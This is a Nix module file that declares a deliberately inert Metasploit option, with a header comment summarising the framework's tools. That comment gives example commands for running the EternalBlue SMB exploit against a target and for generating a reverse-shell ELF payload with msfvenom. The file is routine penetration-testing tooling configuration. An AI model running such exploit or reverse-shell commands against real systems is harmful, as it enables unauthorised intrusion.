/*
  Package: metasploit
  Description: Metasploit Framework for exploit development and offensive security automation.
  Homepage: https://www.metasploit.com/
  Documentation: https://docs.rapid7.com/metasploit/
  Repository: https://github.com/rapid7/metasploit-framework

  Summary:
    * Provides exploit modules, payloads, post-exploitation tools, and auxiliary scanners.
    * Includes `msfconsole`, `msfvenom`, and extensive module database for red teaming and penetration testing.

  Options:
    msfconsole: Launch the interactive console for module management and sessions.
    msfvenom -p <payload> -f <format>: Generate payload binaries or shellcode.
    msfconsole -r <resource.rc>: Execute scripted workflows via resource files.

  Example Usage:
    * `msfconsole -q` — Start the console quietly and search for modules.
    * `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS <target>` → `run` — Test SMBv1 vulnerability.
    * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf` — Craft a reverse shell payload.
*/

{
  config,
  lib,
  ...
}:
let
  MetasploitModule =
    {
      config,
      lib,
      pkgs,
      ...
    }:
    let
      cfg = config.programs.metasploit.extended;
    in
    {
      options.programs.metasploit.extended = {
        enable = lib.mkOption {
          type = lib.types.bool;
          default = false; # Explicitly disabled
          description = lib.mdDoc ''
            Whether to enable Metasploit Framework.

            NOTE: This option exists for consistency but does nothing.
            Metasploit is available in the pentesting devshell only.
            See devshell configuration for actual metasploit access.
          '';
        };
      };

      config = lib.mkIf cfg.enable {
        # Intentionally empty: metasploit stays in the pentesting devshell only.
        warnings = [
          "programs.metasploit.extended is a no-op. Use the pentesting devshell instead."
        ];
      };
    };
in
{
  flake.nixosModules.apps.metasploit = MetasploitModule;
}
